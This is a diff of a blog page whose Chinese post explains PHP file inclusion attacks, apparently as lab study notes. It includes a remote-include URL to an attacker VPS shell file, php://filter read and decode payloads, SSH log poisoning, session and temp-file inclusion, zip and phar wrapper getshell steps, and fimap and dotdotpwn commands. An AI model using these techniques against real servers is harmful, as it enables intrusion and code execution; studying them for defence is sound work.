@@ -13,21 +13,14 @@
 <meta property="og:site_name" content="blacsheep&#39;s blog">
 <meta property="og:description" content="很早就有写一篇总结包含漏洞文章的想法了,加上近期对包含漏洞还有了一些新的学习,都在这里简单记录下 php.ini中的两个allow 即allow_url_fopen和allow_url_include allow_url_fopen表示是否允许将链接以文件的形式打开 allow_url_include表示是否允许将链接以文件形式进行包含 fopen和include均打开 假设一个场景,我们去包含一">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/images/2018/09/2018-09-07-12-12-21%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
-<meta property="og:image" content="http://example.com/images/2018/09/2018-09-07-12-29-28%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
 <meta property="og:image" content="http://example.com/images/2018/09/2018-09-07-12-30-30%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
 <meta property="og:image" content="http://example.com/images/2018/09/2018-09-07-12-35-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
 <meta property="og:image" content="http://example.com/images/2018/09/2018-09-07-13-11-48%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
-<meta property="og:image" content="http://example.com/images/2018/09/2018-09-07-13-19-17%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
-<meta property="og:image" content="http://example.com/images/2018/09/804631-20151116135028890-525890377.jpg">
-<meta property="og:image" content="http://example.com/images/2018/09/2018-09-07-16-43-42%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
-<meta property="og:image" content="http://example.com/images/2018/09/2018-09-07-16-51-35%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
-<meta property="og:image" content="http://example.com/images/2018/09/2018-09-07-17-09-34%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
 <meta property="article:published_time" content="2018-09-07T03:12:14.000Z">
 <meta property="article:modified_time" content="2023-07-10T02:13:29.463Z">
 <meta property="article:author" content="blacsheep">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/images/2018/09/2018-09-07-12-12-21%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta name="twitter:image" content="http://example.com/images/2018/09/2018-09-07-12-30-30%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
     
     
       
@@ -80,7 +73,7 @@
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
 
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
-<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head>
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
 
 <body class="max-width mx-auto px3 ltr">
     
@@ -188,11 +181,16 @@
   <div class="content e-content" itemprop="articleBody">
     <p>很早就有写一篇总结包含漏洞文章的想法了,加上近期对包含漏洞还有了一些新的学习,都在这里简单记录下</p>
 <h2 id="php.ini中的两个allow">php.ini中的两个allow</h2>
-<p>即allow_url_fopen和allow_url_include allow_url_fopen表示是否允许将链接以文件的形式打开 allow_url_include表示是否允许将链接以文件形式进行包含</p>
+<p>即allow_url_fopen和allow_url_include
+allow_url_fopen表示是否允许将链接以文件的形式打开
+allow_url_include表示是否允许将链接以文件形式进行包含</p>
 <h3 id="fopen和include均打开">fopen和include均打开</h3>
-<p>假设一个场景,我们去包含一个url 那么首先是看allow_url_fopen是否开启,如果开启再看allow_url_include是否开启 在两者都开启时就可以包含远程文件,利用也比较简单</p>
+<p>假设一个场景,我们去包含一个url
+那么首先是看allow_url_fopen是否开启,如果开启再看allow_url_include是否开启
+在两者都开启时就可以包含远程文件,利用也比较简单</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/?file=http://your_vps/shell.txt</span><br></pre></td></tr></table></figure>
-<p>即可拿shell 如果后缀需要绕过,那么可以通过#来绕过,举个例子 后端包含代码</p>
+<p>即可拿shell 如果后缀需要绕过,那么可以通过#来绕过,举个例子
+后端包含代码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;secret.php&quot;</span>);</span><br><span class="line">   <span class="comment">//假设$secret不可爆破</span></span><br><span class="line">   <span class="comment">//比如$secret=&quot;.alfalksfhakljsf$%YGBASasidjoasjd12&quot;;</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>].<span class="variable">$secret</span>);</span><br></pre></td></tr></table></figure>
 <p>文件的后缀我们并不知道 那么我们就可以利用url的特性</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/?file=http://your_vps/shell.txt%23</span><br></pre></td></tr></table></figure>
@@ -200,35 +198,55 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your_vps/shell.txt#.alfalksfhakljsf$%YGBASasidjoasjd12</span><br></pre></td></tr></table></figure>
 <p>那么井号后面的东西都无所谓了 当然,利用query什么的也都可以</p>
 <h3 id="fopen关闭include打开">fopen关闭include打开</h3>
-<p>这个时候是可以通过包含代码进行执行的 <img src="/images/2018/09/2018-09-07-12-12-21屏幕截图.png" alt="blacsheep" /></p>
+<p>这个时候是可以通过包含代码进行执行的 <img
+src="/images/2018/09/2018-09-07-12-12-21屏幕截图.png"
+alt="blacsheep" /></p>
 <h3 id="fopen打开include关闭">fopen打开include关闭</h3>
-<p>这个是最正常的,因为allow_url_fopen默认打开,allow_url_include默认关闭 一般来说,只打开fopen,关闭include其实并没有什么很大的作用... 但如果有这么一段代码</p>
+<p>这个是最正常的,因为allow_url_fopen默认打开,allow_url_include默认关闭
+一般来说,只打开fopen,关闭include其实并没有什么很大的作用...
+但如果有这么一段代码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$f</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;http://localhost&#x27;</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$f</span>,<span class="number">100</span>));</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$f</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>如果allow_url_fopen关闭,那么var_dump并不能输出,实际上在fopen的时候就会报错了 不过如果allow_url_fopen打开,那么会输出网页代码 这里仅作一个简单介绍</p>
+<p>如果allow_url_fopen关闭,那么var_dump并不能输出,实际上在fopen的时候就会报错了
+不过如果allow_url_fopen打开,那么会输出网页代码 这里仅作一个简单介绍</p>
 <h3 id="fopen和include都关闭">fopen和include都关闭</h3>
 <p>当然也适用fopen打开的情况</p>
 <h4 id="包含上传的文件">包含上传的文件</h4>
-<p>比如可以上传jpg,txt之类的,然后去包含自己上传的文件即可 <img src="/images/2018/09/2018-09-07-12-29-28屏幕截图.png" alt="blacsheep" /></p>
+<p>比如可以上传jpg,txt之类的,然后去包含自己上传的文件即可 <img
+src="/images/2018/09/2018-09-07-12-29-28屏幕截图.png"
+alt="blacsheep" /></p>
 <h4 id="phpfilter的encode读文件">php://filter的encode读文件</h4>
 <p>前提是过滤并不是那么严格,利用php://filter</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=</span><br></pre></td></tr></table></figure>
-<p><img src="/images/2018/09/2018-09-07-12-30-30屏幕截图.png" alt="blacsheep" /> <strong>存在一些简单的绕过,比如双写绕过,大小写绕过,00截断之类的</strong></p>
+<p><img src="/images/2018/09/2018-09-07-12-30-30屏幕截图.png"
+alt="blacsheep" />
+<strong>存在一些简单的绕过,比如双写绕过,大小写绕过,00截断之类的</strong></p>
 <h4 id="phpfilter的decode执行代码">php://filter的decode执行代码</h4>
-<p>加入对上传的文件进行了过滤,不允许上传含有特殊符号的文件,那么我们可以上传base编码的文件,然后用decode去包含 比如我们在shell.php里面写</p>
+<p>加入对上传的文件进行了过滤,不允许上传含有特殊符号的文件,那么我们可以上传base编码的文件,然后用decode去包含
+比如我们在shell.php里面写</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKcGhwaW5mbygpOwo/Pgo=</span><br></pre></td></tr></table></figure>
 <p>然后利用</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-decode/resource=</span><br></pre></td></tr></table></figure>
 <figure>
-<img src="/images/2018/09/2018-09-07-12-35-08屏幕截图.png" alt="blacsheep" /><figcaption aria-hidden="true">blacsheep</figcaption>
+<img src="/images/2018/09/2018-09-07-12-35-08屏幕截图.png"
+alt="blacsheep" />
+<figcaption aria-hidden="true">blacsheep</figcaption>
 </figure>
 <h4 id="包含日志文件">包含日志文件</h4>
-<p>一般来说是没有权限的,apache2的文件夹权限是默认750,access.log的权限默认640,www-data没有任何权限 这里为了演示,我给<code>chmod 777</code>了,如果实际练习后续记得改回来 <img src="/images/2018/09/2018-09-07-13-11-48屏幕截图.png" alt="blacsheep" /></p>
+<p>一般来说是没有权限的,apache2的文件夹权限是默认750,access.log的权限默认640,www-data没有任何权限
+这里为了演示,我给<code>chmod 777</code>了,如果实际练习后续记得改回来
+<img src="/images/2018/09/2018-09-07-13-11-48屏幕截图.png"
+alt="blacsheep" /></p>
 <h4 id="包含sshlog">包含sshlog</h4>
 <p>sshlog在/var/log/auth.log,权限默认640 包含的时候用ssh连上去</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>@<span class="number">127.0</span>.<span class="number">0.1</span></span><br></pre></td></tr></table></figure>
-<p>密码随意输入,查看日志 <img src="/images/2018/09/2018-09-07-13-19-17屏幕截图.png" alt="blacsheep" /></p>
+<p>密码随意输入,查看日志 <img
+src="/images/2018/09/2018-09-07-13-19-17屏幕截图.png"
+alt="blacsheep" /></p>
 <h4 id="包含session">包含session</h4>
-<p>强网杯的时候利用过 <code>session.upload_progress.enabled</code>如果打开了,我们就可以用传文件的方式传session.当然,如果开启了<code>session.upload_progress.cleanup</code>同样也是可以利用的,不过需要条件竞争,具体的wp可以去看强网杯的easy php那道题 值得一提的是这两个参数php好像是默认开启的 session一般的位置:</p>
+<p>强网杯的时候利用过
+<code>session.upload_progress.enabled</code>如果打开了,我们就可以用传文件的方式传session.当然,如果开启了<code>session.upload_progress.cleanup</code>同样也是可以利用的,不过需要条件竞争,具体的wp可以去看强网杯的easy
+php那道题 值得一提的是这两个参数php好像是默认开启的
+session一般的位置:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSID</span><br></pre></td></tr></table></figure>
 <p>如果能够弄到phpinfo的话就更好说了,phpinfo中是存有session的保存位置的</p>
 <h4 id="procselfenviron">/proc/self/environ</h4>
@@ -236,22 +254,40 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.php以cgi方式运行，这样environ才会保持UA头。</span><br><span class="line">2.environ文件存储位置已知，且environ文件可读。</span><br></pre></td></tr></table></figure>
 <p>用户的ua会存在这个文件里面,不过我本地并没有成功,可以自己去测试一下</p>
 <h4 id="包含临时文件">包含临时文件</h4>
-<p>随意上传一个文件到服务器都是要经过以下步骤的 <img src="/images/2018/09/804631-20151116135028890-525890377.jpg" alt="blacsheep" /> 在临时文件被删除之前可以利用条件竞争进行包含 由于包含需要知道包含的文件名。一种方法是进行暴力猜解,linux下使用的随机函数有缺陷,而window下只有65535中不同的文件名,所以这个方法是可行的。 另一种方法是配合phpinfo页面的php variables,可以直接获取到上传文件的存储路径和临时文件名,直接包含即可</p>
+<p>随意上传一个文件到服务器都是要经过以下步骤的 <img
+src="/images/2018/09/804631-20151116135028890-525890377.jpg"
+alt="blacsheep" /> 在临时文件被删除之前可以利用条件竞争进行包含
+由于包含需要知道包含的文件名。一种方法是进行暴力猜解,linux下使用的随机函数有缺陷,而window下只有65535中不同的文件名,所以这个方法是可行的。
+另一种方法是配合phpinfo页面的php
+variables,可以直接获取到上传文件的存储路径和临时文件名,直接包含即可</p>
 <h2 id="zip扩展">zip扩展</h2>
 <h3 id="安装">安装</h3>
-<p>我kali上面的php是并没有zip扩展的,可以自己去装一下 去<a target="_blank" rel="noopener" href="http://pecl.php.net/package/zip" title="http://pecl.php.net/package/zip">http://pecl.php.net/package/zip</a>下载扩展 然后</p>
+<p>我kali上面的php是并没有zip扩展的,可以自己去装一下 去<a
+target="_blank" rel="noopener" href="http://pecl.php.net/package/zip"
+title="http://pecl.php.net/package/zip">http://pecl.php.net/package/zip</a>下载扩展
+然后</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tar -zxcf xxx.zip</span><br><span class="line">cd xxx</span><br><span class="line">phpize</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
-<p>然后去php.ini里面加上扩展就好了,so路径在/usr/lib/php20170718/ 如果没有phpize就去<code>apt-get install php7.x-dev</code> 缺少lib的话自己apt装一下</p>
+<p>然后去php.ini里面加上扩展就好了,so路径在/usr/lib/php20170718/
+如果没有phpize就去<code>apt-get install php7.x-dev</code>
+缺少lib的话自己apt装一下</p>
 <h3 id="利用zip协议getshell">利用zip协议getshell</h3>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">blacsheep@kali:/var/www/html# cat 1.jpg</span><br><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br><span class="line">blacsheep@kali:/var/www/html# zip -q -o 1.zip 1.jpg</span><br><span class="line">blacsheep@kali:/var/www/html# mv 1.zip 2.jpg</span><br></pre></td></tr></table></figure>
-<p>然后去用zip协议包含就好了 <img src="/images/2018/09/2018-09-07-16-43-42屏幕截图.png" alt="blacsheep" /></p>
+<p>然后去用zip协议包含就好了 <img
+src="/images/2018/09/2018-09-07-16-43-42屏幕截图.png"
+alt="blacsheep" /></p>
 <h2 id="phar扩展">phar扩展</h2>
 <h3 id="phar协议包含getshell">phar协议包含getshell</h3>
-<p>同样利用前面的zip文件 <img src="/images/2018/09/2018-09-07-16-51-35屏幕截图.png" alt="blacsheep" /> 只不过里面的<code>#</code>换成了<code>/</code></p>
+<p>同样利用前面的zip文件 <img
+src="/images/2018/09/2018-09-07-16-51-35屏幕截图.png" alt="blacsheep" />
+只不过里面的<code>#</code>换成了<code>/</code></p>
 <h3 id="phar反序列化">phar反序列化</h3>
-<p>不算文件包含,但提到了phar协议就提一下吧 原理就是<strong>php在解析phar对象的时候会导致metadata的数据被反序列化</strong> 原题是hitcon2017的baby^h-master-php-2017 然后利用点</p>
+<p>不算文件包含,但提到了phar协议就提一下吧
+原理就是<strong>php在解析phar对象的时候会导致metadata的数据被反序列化</strong>
+原题是hitcon2017的baby^h-master-php-2017 然后利用点</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = file_get_contents($_GET[&quot;url&quot;] . &quot;/avatar.gif&quot;);</span><br></pre></td></tr></table></figure>
-<p>然后给了一个恶意构造的phar,导致反序列化漏洞 题外话,想了解的话去看 <a target="_blank" rel="noopener" href="http://localhost/2018/08/15/i%E6%98%A5%E7%A7%8Bweb%E5%88%B7%E9%A2%98%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/#babyh-master-php-2017" title="http://localhost/2018/08/15/i%E6%98%A5%E7%A7%8Bweb%E5%88%B7%E9%A2%98%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/#babyh-master-php-2017">http://localhost/2018/08/15/i%E6%98%A5%E7%A7%8Bweb%E5%88%B7%E9%A2%98%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/#babyh-master-php-2017</a></p>
+<p>然后给了一个恶意构造的phar,导致反序列化漏洞 题外话,想了解的话去看 <a
+target="_blank" rel="noopener" href="http://localhost/2018/08/15/i%E6%98%A5%E7%A7%8Bweb%E5%88%B7%E9%A2%98%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/#babyh-master-php-2017"
+title="http://localhost/2018/08/15/i%E6%98%A5%E7%A7%8Bweb%E5%88%B7%E9%A2%98%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/#babyh-master-php-2017">http://localhost/2018/08/15/i%E6%98%A5%E7%A7%8Bweb%E5%88%B7%E9%A2%98%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/#babyh-master-php-2017</a></p>
 <h2 id="利用工具">利用工具</h2>
 <h3 id="fimap">fimap</h3>
 <p>一旦你的allow_url_include打开了,fimap就可以给你一个shell,当然,你也可以reverse回来</p>
@@ -259,7 +295,9 @@
 <h3 id="dotdotpwn">dotdotpwn</h3>
 <p>用来fuzz文件的一个工具 首先命令使用例子</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dotdotpwn -m &#x27;http-url&#x27; -u &quot;http://127.0.0.1/index.php?file=TRAVERSAL&quot; -k &quot;root&quot;</span><br></pre></td></tr></table></figure>
-<p>给一部分结果 <img src="/images/2018/09/2018-09-07-17-09-34屏幕截图.png" alt="blacsheep" /> 可以看到工具在fuzz可能的<code>.</code>和<code>/</code>的绕过</p>
+<p>给一部分结果 <img
+src="/images/2018/09/2018-09-07-17-09-34屏幕截图.png" alt="blacsheep" />
+可以看到工具在fuzz可能的<code>.</code>和<code>/</code>的绕过</p>
 <hr />
 <p>利用暂时大概就这些了,后续有新的知识学习的话会继续补充</p>
 
